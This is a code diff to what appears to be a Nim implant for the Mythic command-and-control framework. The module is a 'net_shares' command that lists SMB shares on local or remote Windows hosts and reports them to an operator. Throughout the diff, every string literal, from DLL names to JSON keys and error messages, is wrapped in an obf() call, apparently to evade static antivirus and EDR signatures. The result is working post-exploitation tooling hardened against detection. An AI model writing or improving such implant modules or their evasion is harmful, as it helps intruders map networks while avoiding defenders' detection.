@@ -1,6 +1,7 @@
 import std/[json, strformat, os]
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 
 when defined(windows):
   import winim/lean
@@ -30,10 +31,10 @@ when defined(windows):
   proc NetShareEnum(servername: LPCWSTR, level: DWORD, bufptr: ptr pointer,
                     prefmaxlen: DWORD, entriesread: ptr DWORD,
                     totalentries: ptr DWORD, resume_handle: ptr DWORD): DWORD 
-    {.importc, dynlib: "netapi32.dll", stdcall.}
+    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
   
   proc NetApiBufferFree(Buffer: pointer): DWORD 
-    {.importc, dynlib: "netapi32.dll", stdcall.}
+    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
   
   proc utf16PtrToString(p: LPWSTR): string =
     ## Convert UTF-16 pointer to Nim string
@@ -58,18 +59,18 @@ proc netShares*(taskId: string, params: JsonNode): JsonNode =
     try:
       # Parse parameters
       var computerName = ""
-      if params.kind == JObject and params.hasKey("computer"):
-        computerName = params["computer"].getStr()
+      if params.kind == JObject and params.hasKey(obf("computer")):
+        computerName = params[obf("computer")].getStr()
       
       # Default to local computer if not specified
       if computerName == "":
-        computerName = getEnv("COMPUTERNAME", "Local")
+        computerName = getEnv(obf("COMPUTERNAME"), obf("Local"))
       
       debug &"[DEBUG] net_shares: computer={computerName}"
       
       var bufPtr: pointer = nil
       var computerNameW: LPCWSTR = nil
-      if computerName != "" and computerName != "Local":
+      if computerName != "" and computerName != obf("Local"):
         let tempW = newWideCString(computerName)
         computerNameW = cast[LPCWSTR](unsafeAddr tempW[0])
       var entriesRead: DWORD = 0
@@ -97,15 +98,15 @@ proc netShares*(taskId: string, params: JsonNode): JsonNode =
           
           let shareType = case shares[i].shi1_type.uint32
             of STYPE_DISKTREE:
-              "Disk Drive"
+              obf("Disk Drive")
             of STYPE_PRINTQ:
-              "Print Queue"
+              obf("Print Queue")
             of STYPE_DEVICE:
-              "Communication Device"
+              obf("Communication Device")
             of STYPE_IPC:
-              "Interprocess Communication (IPC)"
+              obf("Interprocess Communication (IPC)")
             of STYPE_SPECIAL:
-              "Special Reserved for IPC"
+              obf("Special Reserved for IPC")
             else:
               &"Unknown type ({shares[i].shi1_type})"
           
@@ -134,16 +135,16 @@ proc netShares*(taskId: string, params: JsonNode): JsonNode =
       var resultsJson = newJArray()
       for result in results:
         resultsJson.add(%*{
-          "computer_name": result.computer_name,
-          "share_name": result.share_name,
-          "comment": result.comment,
-          "share_type": result.share_type,
-          "readable": result.readable
+          obf("computer_name"): result.computer_name,
+          obf("share_name"): result.share_name,
+          obf("comment"): result.comment,
+          obf("share_type"): result.share_type,
+          obf("readable"): result.readable
         })
       
       return mythicSuccess(taskId, $resultsJson)
       
     except Exception as e:
-      return mythicError(taskId, &"net_shares error: {e.msg}")
+      return mythicError(taskId, obf("net_shares error: ") & e.msg)
   else:
-    return mythicError(taskId, "net_shares command is only available on Windows")
+    return mythicError(taskId, obf("net_shares command is only available on Windows"))
